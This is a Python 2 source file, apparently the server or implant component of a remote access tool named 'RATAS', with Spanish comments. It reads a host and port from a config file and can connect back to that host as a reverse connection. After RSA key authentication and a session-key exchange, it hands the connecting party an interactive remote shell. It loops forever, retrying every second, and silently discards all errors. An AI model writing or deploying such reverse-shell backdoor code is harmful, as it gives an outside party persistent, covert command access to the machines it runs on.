#!/usr/bin/env python
# -*- coding: utf-8 -*-
# RATAS [Server]

import os
import sys
import time
import ConfigParser

from lib.connection import Connection
from lib.shell_srv import Shell
from lib.keyring import Keyring

CFG_FILE = "./server.cfg"

def read_conf():
    cfg = ConfigParser.ConfigParser()
    cfg.read([CFG_FILE])
    host = cfg.get('GENERAL', 'host')
    port = cfg.get('GENERAL', 'port')
    reverse = cfg.get('GENERAL', 'reverse_conn')
    pub_key = cfg.get('PKI', 'pub_key')
    prv_key = cfg.get('PKI', 'prv_key')
    known_hosts = cfg.get('PKI', 'known_hosts')

    return host, int(port), reverse, pub_key, prv_key, known_hosts


def main():
    initial_path = os.path.dirname(os.path.abspath(__file__))

    HOST, PORT, REVERSE, PUB_KEY_FILE, PRV_KEY_FILE, KN_HOSTS_FILE = read_conf()

    # Comprobar que exista un fichero con la clave pública del cliente
    if os.path.isfile(KN_HOSTS_FILE):
        with open(KN_HOSTS_FILE, "rb") as f:
            known_hosts = f.read()
        known_hosts = known_hosts.split("\n")
    else:
        print '[!] ERROR: El fichero {} debe existir.'.format(KN_HOSTS_FILE)
        sys.exit(1)

    while True:
        time.sleep(1)

        # Creación del socket
        conn = Connection(HOST, PORT)

        try:
            if REVERSE == '1':
                conn.connect()
            else:
                conn.listen(timeout=5)

            keyring = Keyring()

            # Lee los ficheros de claves pub/priv
            with open(PRV_KEY_FILE, 'rb') as f:
                prv_key = f.read()
            with open(PUB_KEY_FILE, 'rb') as f:
                pub_key = f.read()

            # Recibe la clave pública del cliente
            cli_pub_key = conn.receive()

            # Si no reconoce la clave pub del cliente, informa de que se cierra la conexión
            if cli_pub_key not in known_hosts:
                conn.send(':ERR:')
                sys.exit(1)
            # Si reconoce la clave pub del cliente, le envía su clave pública
            conn.send(pub_key)

            # Recibe firma de autenticación del cliente y la comprueba
            cli_signature = conn.receive()
            sign_valid = keyring.verify(cli_pub_key, cli_signature)
            # Si es válida, envía su firma de autenticación
            if sign_valid:
                signature = keyring.sign(prv_key)
                conn.send(signature)
            else:
                conn.send(':ERR:')
                sys.exit(1)

            # Si el cliente no acepta la firma, cierra el programa
            auth = conn.receive()
            if auth == ':ERR:':
                sys.exit(1)

            # Marca de sincronización
            conn.send(':SYNC:')
            # Intercambio de clave de sesión mediante PKI
            session_key_crypted = conn.receive()
            session_key = keyring.decipherRSA(session_key_crypted, prv_key)

            # Una vez establecida e intercambiada la clave de sesión, asociamos el keyring a la conexión
            keyring.session_key = session_key
            conn.keyring = keyring

            shell = Shell(conn)
            shell.start()
            os.chdir(initial_path)  # Por si el cliente se cambió de directorio

        except:
            pass


if __name__ == '__main__':
    main()